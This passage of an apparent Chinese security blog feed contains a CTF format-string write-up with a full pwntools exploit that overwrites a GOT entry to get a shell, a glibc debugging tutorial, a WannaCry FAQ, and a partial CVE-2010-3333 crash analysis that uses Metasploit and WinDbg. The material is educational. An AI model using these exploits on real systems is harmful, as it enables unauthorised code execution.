    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>一朋友问到在pwn中，gdb调试看到了<code>systemm(&quot;/bin/sh&quot;)</code>了，但是shell确无法启动。于是我详细看了一下这个题目，发现自己的exploit绝大多数情况下也无法启动shell。</p>
<a id="more"></a>
<h2 id="0x01-题目解答"><a href="#0x01-题目解答" class="headerlink" title="0x01 题目解答"></a>0x01 题目解答</h2><p>用IDA逆了一下，程序很简单，printf的参数可以控制。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+14h] [bp-6Ch]@3</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+18h] [bp-68h]@5</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+7Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  v5 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    introduce();</div><div class="line">    <span class="keyword">do</span></div><div class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v3);</div><div class="line">    <span class="keyword">while</span> ( (<span class="keyword">char</span> *)(<span class="keyword">char</span>)getchar() == <span class="string">"\n"</span> );</div><div class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"please input your name:"</span>);</div><div class="line">      gets((<span class="keyword">char</span> *)&amp;v4);</div><div class="line">      <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4);</div><div class="line">      <span class="built_in">puts</span>(<span class="string">",you are welcome!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"nothing!!!!lol"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"please,don't trick me"</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>程序是一个循环，所以可以无限次的利于格式化字符串漏洞。</p>
<p>我们可以通过第一次利用，泄漏任意一个函数的地址，通过libc计算偏移从而计算出system函数的地址。<br>通过第二次利用可以通过printf来覆盖gets的GOT表中的地址的前三位（小端存储），即可将gets的GOT中的地址换成system的地址。<br>有了system的地址，还需要一个<code>sh</code>的地址。然而由于gets的参数就是指针，所以需要v4指向的值为<code>sh</code>。于是可以在第二次利用payload中加上字符<code>sh</code>，此时有个技巧，因为没法控制<code>sh</code>后面是0x00，所以需要在sh后面加一个分号，这样就将这个长字符串当成<code>sh</code>和未知命令来执行。</p>
<p>写GOT表还有个小技巧，因为通过printf来写内存的时候是将printf打印出来字符的数量写入内存。因此，当写一个很大的值时屏幕会打印很多字符导致程序崩掉。</p>
<p>所以，在这里我们使用一字节写<code>%hhn</code>,按字节顺序写gets函数GOT表中的三个字节（一次完成）。</p>
<h2 id="0x02-Exploit及其无法启动分析"><a href="#0x02-Exploit及其无法启动分析" class="headerlink" title="0x02 Exploit及其无法启动分析"></a>0x02 Exploit及其无法启动分析</h2><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#io = remote("115.28.185.220", 11111)</span></div><div class="line">io = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</div><div class="line"></div><div class="line">context.log_level = <span class="string">"DEBUG"</span></div><div class="line"></div><div class="line"><span class="comment">#raw_input()</span></div><div class="line"></div><div class="line">elf = ELF(<span class="string">"./pwn1"</span>)</div><div class="line"><span class="comment">#libc = ELF("./libc32.so")</span></div><div class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</div><div class="line">gets_system = libc.symbols[<span class="string">"gets"</span>] - libc.symbols[<span class="string">"system"</span>]</div><div class="line"></div><div class="line"></div><div class="line">io.recvuntil(<span class="string">"plz input$"</span>)</div><div class="line">io.sendline(<span class="string">"1"</span>)</div><div class="line">io.recvuntil(<span class="string">"please input your name:"</span>)</div><div class="line">payload = p32(elf.got[<span class="string">"gets"</span>]) + <span class="string">"%6$s"</span></div><div class="line">io.sendline(payload)</div><div class="line">gets_addr = io.recvuntil(<span class="string">"Welcome to ziiiro's class"</span>)[<span class="number">5</span>:<span class="number">9</span>]</div><div class="line">gets_addr = u32(gets_addr)</div><div class="line"></div><div class="line">log.success(<span class="string">"[gets addr] = &gt; &#123;&#125;"</span>.format(hex(gets_addr)))</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#io.interactive()</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sum</span><span class="params">(pre, num)</span>:</span></div><div class="line">    x = num - pre</div><div class="line">    <span class="keyword">if</span> x &lt; <span class="number">0</span>:</div><div class="line">        x = <span class="number">255</span> + x + <span class="number">1</span></div><div class="line">    <span class="keyword">return</span> x</div><div class="line"></div><div class="line">system_addr = p32(gets_addr - gets_system)</div><div class="line"></div><div class="line">num1 = get_sum(<span class="number">16</span>, ord(system_addr[<span class="number">0</span>]))</div><div class="line">num2 = get_sum(<span class="number">16</span>+num1, ord(system_addr[<span class="number">1</span>]))</div><div class="line">num3 = get_sum(<span class="number">16</span>+num1+num2, ord(system_addr[<span class="number">2</span>]))</div><div class="line"></div><div class="line">log.success(<span class="string">"[system addr] = &gt; &#123;&#125;"</span>.format(hex(gets_addr - gets_system)))</div><div class="line"></div><div class="line"><span class="keyword">print</span> num1, num2, num3</div><div class="line">raw_input()</div><div class="line"></div><div class="line">payload  = <span class="string">"sh;a"</span></div><div class="line">payload += p32(elf.got[<span class="string">"gets"</span>])</div><div class="line">payload += p32(elf.got[<span class="string">"gets"</span>] + <span class="number">1</span>)</div><div class="line">payload += p32(elf.got[<span class="string">"gets"</span>] + <span class="number">2</span>)</div><div class="line">payload += <span class="string">"a"</span> * num1 + <span class="string">"%7$hhn"</span></div><div class="line">payload += <span class="string">"b"</span> * num2 + <span class="string">"%8$hhn"</span></div><div class="line">payload += <span class="string">"c"</span> * num3 + <span class="string">"%9$hhn"</span></div><div class="line">payload += <span class="string">"\x00"</span></div><div class="line"></div><div class="line">io.recvuntil(<span class="string">"plz input$"</span>)</div><div class="line">io.sendline(<span class="string">"1"</span>)</div><div class="line">io.recvuntil(<span class="string">"please input your name:"</span>)</div><div class="line">io.sendline(payload)</div><div class="line">io.recvuntil(<span class="string">"Welcome to ziiiro's class"</span>)</div><div class="line"></div><div class="line"></div><div class="line">io.recvuntil(<span class="string">"plz input$"</span>)</div><div class="line">io.sendline(<span class="string">"1"</span>)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
<p>调试，看为什么无法执行shell。<code>system</code>执行流程如下</p>
<p>system -&gt; __libc_system -&gt; do_system -&gt; execve</p>
<p>do_system</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> FORK</span></div><div class="line">  pid = FORK ();</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">  pid = __fork ();</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">  <span class="keyword">if</span> (pid == (<span class="keyword">pid_t</span>) <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">      <span class="comment">/* Child side.  */</span></div><div class="line">      <span class="keyword">const</span> <span class="keyword">char</span> *new_argv[<span class="number">4</span>];</div><div class="line">      new_argv[<span class="number">0</span>] = SHELL_NAME;</div><div class="line">      new_argv[<span class="number">1</span>] = <span class="string">"-c"</span>;</div><div class="line">      new_argv[<span class="number">2</span>] = line;</div><div class="line">      new_argv[<span class="number">3</span>] = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">      <span class="comment">/* Restore the signals.  */</span></div><div class="line">      (<span class="keyword">void</span>) __sigaction (SIGINT, &amp;intr, (<span class="keyword">struct</span> sigaction *) <span class="literal">NULL</span>);</div><div class="line">      (<span class="keyword">void</span>) __sigaction (SIGQUIT, &amp;quit, (<span class="keyword">struct</span> sigaction *) <span class="literal">NULL</span>);</div><div class="line">      (<span class="keyword">void</span>) __sigprocmask (SIG_SETMASK, &amp;omask, (<span class="keyword">sigset_t</span> *) <span class="literal">NULL</span>);</div><div class="line">      INIT_LOCK ();</div><div class="line"></div><div class="line">      <span class="comment">/* Exec the shell.  */</span></div><div class="line">      (<span class="keyword">void</span>) __execve (SHELL_PATH, (<span class="keyword">char</span> *<span class="keyword">const</span> *) new_argv, __environ);</div><div class="line">      _exit (<span class="number">127</span>);</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (pid &lt; (<span class="keyword">pid_t</span>) <span class="number">0</span>)</div><div class="line">    <span class="comment">/* The fork failed.  */</span></div><div class="line">    status = <span class="number">-1</span>;</div><div class="line">  <span class="keyword">else</span></div><div class="line">    <span class="comment">/* Parent side.  */</span></div><div class="line">    &#123;</div><div class="line">      <span class="comment">/* Note the system() is a cancellation point.  But since we call</span></div><div class="line">     waitpid() which itself is a cancellation point we do not</div><div class="line">     have to do anything here.  */</div><div class="line">      <span class="keyword">if</span> (TEMP_FAILURE_RETRY (__waitpid (pid, &amp;status, <span class="number">0</span>)) != pid)</div><div class="line">    status = <span class="number">-1</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>可以看出do_system的流程是这样的，先fork一个进程。子进程去执行execve。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">Legend: code, data, rodata, value</div><div class="line"><span class="number">136</span>       (<span class="keyword">void</span>) __execve (SHELL_PATH, (<span class="keyword">char</span> *<span class="keyword">const</span> *) new_argv, __environ);</div><div class="line">gdb-peda$ p new_argv</div><div class="line">$<span class="number">3</span> = &#123;<span class="number">0xf7732bb1</span> <span class="string">"sh"</span>, <span class="number">0xf7732ba9</span> <span class="string">"-c"</span>,</div><div class="line">  <span class="number">0xffb4b4d8</span> <span class="string">"sh;a\024\240\004\b\025\240\004\b\026\240\004\b%7$hhn"</span>, <span class="string">'b'</span> &lt;repeats <span class="number">178</span> times&gt;..., <span class="number">0x0</span>&#125;</div><div class="line">gdb-peda$ p __environ</div><div class="line">$<span class="number">4</span> = (<span class="keyword">char</span> **) <span class="number">0xffb4b5ec</span></div><div class="line">gdb-peda$ x/wx <span class="number">0xffb4b5ec</span></div><div class="line"><span class="number">0xffb4b5ec</span>: <span class="number">0x63636363</span>  =&gt; not Accessable</div><div class="line">gdb-peda$</div></pre></td></tr></table></figure>
<p>可以看出<code>__environ</code>与<code>new_argv</code>中的第三个元素只差0x114 = 276个字符，所以直接被payload覆盖了。</p>
<p>execve有三个参数，第一个参数是，第二个参数是argv，第三个参数是envp。其中第二个参数和第三个参数都是char **类型的，也就是说都是字符串数组。然而，我们可以通过调试看出由于argv中的第三个元素，也就是我们system的参数过长，导致覆盖掉了<code>__environ</code>，也就是覆盖了<code>__environ</code>中的指针，此时程序会访问这个指针指向的地址，当然这个地址是不可访问的。程序fork出来的进程就会crash。所以shell并没有启动起来。</p>
<p>那么还有一个问题，有时候shell却能起成功。原因是：人品好！因为payload是根据system地址动态变化的，所以当地址差值刚好变小的时候payload无法覆盖__environ。这时候shell便可以成功启动。</p>
<h2 id="0x03-解决方法"><a href="#0x03-解决方法" class="headerlink" title="0x03 解决方法"></a>0x03 解决方法</h2><p>在printf修改GOT表的时候，同时将payload用0x00截断即可。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;一朋友问到在pwn中，gdb调试看到了&lt;code&gt;systemm(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;了，但是shell确无法启动。于是我详细看了一下这个题目，发现自己的exploit绝大多数情况下也无法启动shell。&lt;/p&gt;
    
    </summary>
    
      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu上源码调试glibc</title>
    <link href="http://weaponx.site/2017/05/19/Ubuntu%E4%B8%8A%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95glibc/"/>
    <id>http://weaponx.site/2017/05/19/Ubuntu上源码调试glibc/</id>
    <published>2017-05-19T08:02:47.000Z</published>
    <updated>2017-05-19T08:17:05.219Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>最近有个需求，需要源码调试glibc。由于系统的glibc没有调试符号，所以也算费了一番周折。不过ubuntu还是比较人性化的。</p>
<a id="more"></a>
<h2 id="0x01-方法"><a href="#0x01-方法" class="headerlink" title="0x01 方法"></a>0x01 方法</h2><p>首先在ubuntu上安装带调试符号的libc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">sudo apt-get install libc-dbg</div></pre></td></tr></table></figure>
<p>在32位下命令如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">sudo apt-get install libc-dbg:i386</div></pre></td></tr></table></figure>
<p>其次，需要通过apt来下载源码。Ubuntu的源码是基于GNU libc做了修改，随意最好通过Ubuntu的源来下载。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">sudo apt-get install <span class="built_in">source</span> libc-dev</div></pre></td></tr></table></figure>
<p>执行这条命令可能会报错。因为在替换国内源的时候，没有加上deb-src的源。在<code>source.list</code>中查看是否有deb-src，如果没有，添加这个源即可。</p>
<p>命令执行完成后会在当前目录多一个<code>eglibc-版本</code>的文件夹，比如我的机器是<code>glibc-2.19</code>，则下载的目录为<code>eglibc-2.19</code></p>
<h2 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h2><p>在gdb中需要设置源码搜索路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">directory /home/user/eglibc-2.19/nptl</div></pre></td></tr></table></figure>
<p>再跟进libc中就会有源码了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;最近有个需求，需要源码调试glibc。由于系统的glibc没有调试符号，所以也算费了一番周折。不过ubuntu还是比较人性化的。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
      <category term="调试" scheme="http://weaponx.site/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>勒索软件WannaCry的FAQ</title>
    <link href="http://weaponx.site/2017/05/16/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6WannaCry%E7%9A%84FAQ/"/>
    <id>http://weaponx.site/2017/05/16/勒索软件WannaCry的FAQ/</id>
    <published>2017-05-16T06:48:51.000Z</published>
    <updated>2017-05-19T03:21:25.831Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是勒索软件"><a href="#什么是勒索软件" class="headerlink" title="什么是勒索软件"></a>什么是勒索软件</h2><p>勒索软件就是利用加密手段，加密感染机器上的特定文件。要求用户支付赎金（通常为比特币）后，黑客会解密被加密的文件。</p>
<h2 id="什么是比特币"><a href="#什么是比特币" class="headerlink" title="什么是比特币"></a>什么是比特币</h2><p>比特币利用区块链(Block chain)技术，通过计算产生，总量趋于一个固定值，可以兑换成一些现实货币。</p>
<h2 id="WannaCry勒索软件为什么会这么火"><a href="#WannaCry勒索软件为什么会这么火" class="headerlink" title="WannaCry勒索软件为什么会这么火"></a>WannaCry勒索软件为什么会这么火</h2><p>勒索软件流程时间比较长，但是WannaCry作为勒索软件中的一员，利用了NSA方程式组织的SMB漏洞利用工具EternalBlue来远程执行任意代码，这个漏洞在2017年3月微软补丁日被修复，补丁编号MS17-010。因为修复时间比较近，而且由于某些原因，国内打补丁的习惯并没有养成。</p>
<h2 id="WannaCry是怎么加密的"><a href="#WannaCry是怎么加密的" class="headerlink" title="WannaCry是怎么加密的"></a>WannaCry是怎么加密的</h2><p>简要的说WannaCry是通过AES和RSA共同加密。其中AES是对称加密（加密密钥和解密密钥是同一个），RSA是非对称加密（加密密钥和解密密钥不同，公钥用来加密、私钥用来解密，反之也可）。<br>作者有个公私钥对A1/A2，把公钥A1内置在程序中。当程序运行时再生成一对公私钥对B1/B2，用公钥A1加密私钥B2。WannaCry对每个文件生成一个随机AES密钥，然后用这个密钥来加密对应的文件。随后，用生成的RSA公钥B1来加密这个AES密钥。</p>
<h2 id="WannaCry支付赎金后黑客是否可以解开被加密的文件"><a href="#WannaCry支付赎金后黑客是否可以解开被加密的文件" class="headerlink" title="WannaCry支付赎金后黑客是否可以解开被加密的文件"></a>WannaCry支付赎金后黑客是否可以解开被加密的文件</h2><p>可以。解密流程是这样的，支付赎金后将Transaction id和被加密的RSA密钥B2的发给黑客。黑客验证通过即可用RSA私钥解开被加密的密钥B2，然后用户就可以用被解密密钥B2来解密AES密钥，用被解密的AES密钥来恢复被加密的文件。</p>
<h2 id="网上说的各种数据恢复工具可以恢复数据吗"><a href="#网上说的各种数据恢复工具可以恢复数据吗" class="headerlink" title="网上说的各种数据恢复工具可以恢复数据吗"></a>网上说的各种数据恢复工具可以恢复数据吗</h2><p>网上的一些号称解密程序基本都是基于删除的文件恢复，删除文件恢复的原理是当系统删除文件的时候并不会真正的删除文件，而是标记这块区域没有占用，只要这块内容没有被覆盖则很有可能恢复。但是WannaCry是一边删除一边写文件，而且会向源文件写入随机内容。所以基于误删恢复的基本不太可能。</p>
<h2 id="不交赎金是否有办法恢复加密后的文件"><a href="#不交赎金是否有办法恢复加密后的文件" class="headerlink" title="不交赎金是否有办法恢复加密后的文件"></a>不交赎金是否有办法恢复加密后的文件</h2><p>基本不可能。</p>
<h2 id="更新微软补丁能否防止勒索软件攻击"><a href="#更新微软补丁能否防止勒索软件攻击" class="headerlink" title="更新微软补丁能否防止勒索软件攻击"></a>更新微软补丁能否防止勒索软件攻击</h2><p>微软补丁只是防止勒索软件利用远程代码执行的漏洞进行传播，如果在电脑上运行了勒索软件还是会被勒索。</p>
<h2 id="以后如何防止类似的事情发生"><a href="#以后如何防止类似的事情发生" class="headerlink" title="以后如何防止类似的事情发生"></a>以后如何防止类似的事情发生</h2><p>安装一线厂商的杀毒软件，如卡巴斯基，BitDefender等。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;什么是勒索软件&quot;&gt;&lt;a href=&quot;#什么是勒索软件&quot; class=&quot;headerlink&quot; title=&quot;什么是勒索软件&quot;&gt;&lt;/a&gt;什么是勒索软件&lt;/h2&gt;&lt;p&gt;勒索软件就是利用加密手段，加密感染机器上的特定文件。要求用户支付赎金（通常为比特币）后，黑客会解密被
    
    </summary>
    
      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2010-3333分析[漏洞战争]</title>
    <link href="http://weaponx.site/2017/05/08/CVE-2010-3333%E5%88%86%E6%9E%90-%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/"/>
    <id>http://weaponx.site/2017/05/08/CVE-2010-3333分析-漏洞战争/</id>
    <published>2017-05-08T08:37:33.000Z</published>
    <updated>2017-05-08T08:42:20.758Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2010-3333漏洞是一个栈溢出漏洞，该漏洞是由于Microsoft word在处理RTF数据的对数据解析处理错误，可被利用破坏内存，导致任意代码执行。</p>
<a id="more"></a>
<p>首先使用metsaploit生成crash poc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">msf &gt; search CVE-2010-3333</div><div class="line">[!] Module database cache not built yet, using slow search</div><div class="line"></div><div class="line">Matching Modules</div><div class="line">================</div><div class="line"></div><div class="line">   Name                                                    Disclosure Date  Rank   Description</div><div class="line">   ----                                                    ---------------  ----   -----------</div><div class="line">   exploit/windows/fileformat/ms10_087_rtf_pfragments_bof  2010-11-09       great  MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow (File Format)</div><div class="line"></div><div class="line"></div><div class="line">msf &gt; use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof</div><div class="line">msf exploit(ms10_087_rtf_pfragments_bof) &gt; show options</div><div class="line"></div><div class="line">Module options (exploit/windows/fileformat/ms10_087_rtf_pfragments_bof):</div><div class="line"></div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   FILENAME  msf.rtf          yes       The file name.</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Automatic</div><div class="line"></div><div class="line"></div><div class="line">msf exploit(ms10_087_rtf_pfragments_bof) &gt; info</div><div class="line"></div><div class="line">       Name: MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow (File Format)</div><div class="line">     Module: exploit/windows/fileformat/ms10_087_rtf_pfragments_bof</div><div class="line">   Platform: Windows</div><div class="line"> Privileged: No</div><div class="line">    License: Metasploit Framework License (BSD)</div><div class="line">       Rank: Great</div><div class="line">  Disclosed: 2010-11-09</div><div class="line"></div><div class="line">Provided by:</div><div class="line">  wushi of team509</div><div class="line">  unknown</div><div class="line">  jduck &lt;jduck@metasploit.com&gt;</div><div class="line">  DJ Manila Ice, Vesh, CA</div><div class="line"></div><div class="line">Available targets:</div><div class="line">  Id  Name</div><div class="line">  --  ----</div><div class="line">  0   Automatic</div><div class="line">  1   Microsoft Office 2002 SP3 English on Windows XP SP3 English</div><div class="line">  2   Microsoft Office 2003 SP3 English on Windows XP SP3 English</div><div class="line">  3   Microsoft Office 2007 SP0 English on Windows XP SP3 English</div><div class="line">  4   Microsoft Office 2007 SP0 English on Windows Vista SP0 English</div><div class="line">  5   Microsoft Office 2007 SP0 English on Windows 7 SP0 English</div><div class="line">  6   Crash Target <span class="keyword">for</span> Debugging</div><div class="line"></div><div class="line">Basic options:</div><div class="line">  Name      Current Setting  Required  Description</div><div class="line">  ----      ---------------  --------  -----------</div><div class="line">  FILENAME  msf.rtf          yes       The file name.</div><div class="line"></div><div class="line">Payload information:</div><div class="line">  Space: 512</div><div class="line">  Avoid: 1 characters</div><div class="line"></div><div class="line">Description:</div><div class="line">  This module exploits a stack-based buffer overflow <span class="keyword">in</span> the handling</div><div class="line">  of the <span class="string">'pFragments'</span> shape property within the Microsoft Word RTF</div><div class="line">  parser. All versions of Microsoft Office 2010, 2007, 2003, and XP</div><div class="line">  prior to the release of the MS10-087 bulletin are vulnerable. This</div><div class="line">  module does not attempt to exploit the vulnerability via Microsoft</div><div class="line">  Outlook. The Microsoft Word RTF parser was only used by default <span class="keyword">in</span></div><div class="line">  versions of Microsoft Word itself prior to Office 2007. With the</div><div class="line">  release of Office 2007, Microsoft began using the Word RTF parser,</div><div class="line">  by default, to handle rich-text messages within Outlook as well. It</div><div class="line">  was possible to configure Outlook 2003 and earlier to use the</div><div class="line">  Microsoft Word engine too, but it was not a default setting. It</div><div class="line">  appears as though Microsoft Office 2000 is not vulnerable. It is</div><div class="line">  unlikely that Microsoft will confirm or deny this since Office 2000</div><div class="line">  has reached its support cycle end-of-life.</div><div class="line"></div><div class="line">References:</div><div class="line">  http://cvedetails.com/cve/2010-3333/</div><div class="line">  http://www.osvdb.org/69085</div><div class="line">  http://technet.microsoft.com/en-us/security/bulletin/MS10-087</div><div class="line">  http://www.securityfocus.com/bid/44652</div><div class="line">  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=880</div><div class="line"></div><div class="line">msf exploit(ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> target 6</div><div class="line">target =&gt; 6</div><div class="line">msf exploit(ms10_087_rtf_pfragments_bof) &gt; run</div><div class="line"></div><div class="line">[*] Creating <span class="string">'msf.rtf'</span> file ...</div><div class="line">[+] msf.rtf stored at /root/.msf4/<span class="built_in">local</span>/msf.rtf</div><div class="line">msf exploit(ms10_087_rtf_pfragments_bof) &gt;</div></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>直接打开后发生访问违例</p>
<p><img src="1.png" alt=""></p>
<p><code>rep movs dword ptr es:[edi], dword ptr [esi]</code>是把esi指向的内存拷贝ecx个大小到edi指向的内存中，可以看出异常是因为拷贝的目的地址为READONLY，看到调用栈也被破坏了，所以是一个在<code>mso.dll</code>中发生的栈溢出漏洞。</p>
<p>然后在<code>30ed442c</code>下短点，看调用栈。先用<code>sxe ld:mso</code>在mso被加载的时候断下，再下<code>30ed442c</code>的断点，然后看调用栈。</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</div><div class="line">ChildEBP RetAddr  Args to Child              </div><div class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</div><div class="line"><span class="number">00123</span>ea8 <span class="number">30</span>f0b56b <span class="number">00124014</span> <span class="number">00000000</span> ffffffff mso!Ordinal1<span class="number">246+0x16b0</span></div><div class="line"><span class="number">00123</span>ed8 <span class="number">30f0b4f9</span> <span class="number">00124060</span> <span class="number">00124014</span> <span class="number">00000000</span> mso!Ordinal12<span class="number">73+0x2581</span></div><div class="line"><span class="number">00124124</span> <span class="number">30d4d795</span> <span class="number">00000000</span> <span class="number">00124164</span> <span class="number">00000000</span> mso!Ordinal1273+<span class="number">0</span>x250f</div><div class="line"><span class="number">0012414</span>c <span class="number">30d</span>4d70d <span class="number">30d4d5a8</span> <span class="number">00</span>f114dc <span class="number">00f11514</span> mso!Ordinal5575+<span class="number">0</span>xf9</div><div class="line"><span class="number">00124150</span> <span class="number">30d4d5a8</span> <span class="number">00</span>f114dc <span class="number">00f11514</span> <span class="number">00f113c4</span> mso!Ordinal<span class="number">5575+0x71</span></div><div class="line"><span class="number">00124154</span> <span class="number">00</span>f114dc <span class="number">00f11514</span> <span class="number">00f113c4</span> <span class="number">30d</span>ce40c mso!Ordinal4099+<span class="number">0</span>xf5</div><div class="line"><span class="number">00124158</span> <span class="number">00f11514</span> <span class="number">00f113c4</span> <span class="number">30d</span>ce40c <span class="number">00000000</span> <span class="number">0</span>xf114dc</div><div class="line"><span class="number">0012415</span>c <span class="number">00f113c4</span> <span class="number">30d</span>ce40c <span class="number">00000000</span> <span class="number">00f11128</span> <span class="number">0</span>xf11514</div><div class="line"><span class="number">00124160</span> <span class="number">30d</span>ce40c <span class="number">00000000</span> <span class="number">00f11128</span> <span class="number">00124f10</span> <span class="number">0</span>xf113c4</div><div class="line"><span class="number">00124164</span> <span class="number">00000000</span> <span class="number">00f11128</span> <span class="number">00124f10</span> <span class="number">00000000</span> mso!Ordinal2940+<span class="number">0</span>x1588c</div></pre></td></tr></table></figure>
<p>然后在调用者下断点<code>bp mso!Ordinal1273+0x25d8</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="number">000</span>&gt; t</div><div class="line">eax=<span class="number">30d</span>a33d8 ebx=<span class="number">05000000</span> ecx=<span class="number">00123e98</span> edx=<span class="number">00000000</span> esi=<span class="number">00f</span>11100 edi=<span class="number">00124060</span></div><div class="line">eip=<span class="number">30f</span>0b5f8 esp=<span class="number">00123e7</span>c ebp=<span class="number">00123</span>ea8 iopl=<span class="number">0</span>         nv up ei pl zr na pe nc</div><div class="line">cs=<span class="number">001</span>b  ss=<span class="number">0023</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">003</span>b  gs=<span class="number">0000</span>             efl=<span class="number">00000246</span></div><div class="line">mso!Ordinal1273+<span class="number">0x260e</span>:</div><div class="line"><span class="number">30f</span>0b5f8 ff501c          call    dword ptr [eax+<span class="number">1</span>Ch]  ds:<span class="number">0023</span>:<span class="number">30d</span>a33f4=<span class="number">30</span>ed4406</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dds eax</div><div class="line"><span class="number">30d</span>a33d8  <span class="number">31242763</span> mso!Ordinal3247+<span class="number">0x2f</span></div><div class="line"><span class="number">30d</span>a33dc  <span class="number">30e7</span>bc33 mso!Ordinal2616+<span class="number">0x26c</span></div><div class="line"><span class="number">30d</span>a33e0  <span class="number">30</span>ef0964 mso!Ordinal1010</div><div class="line"><span class="number">30d</span>a33e4  <span class="number">3124278</span>c mso!Ordinal3247+<span class="number">0x58</span></div><div class="line"><span class="number">30d</span>a33e8  <span class="number">312427</span>a4 mso!Ordinal3247+<span class="number">0x70</span></div><div class="line"><span class="number">30d</span>a33ec  <span class="number">30f</span>1c4bc mso!Ordinal2200+<span 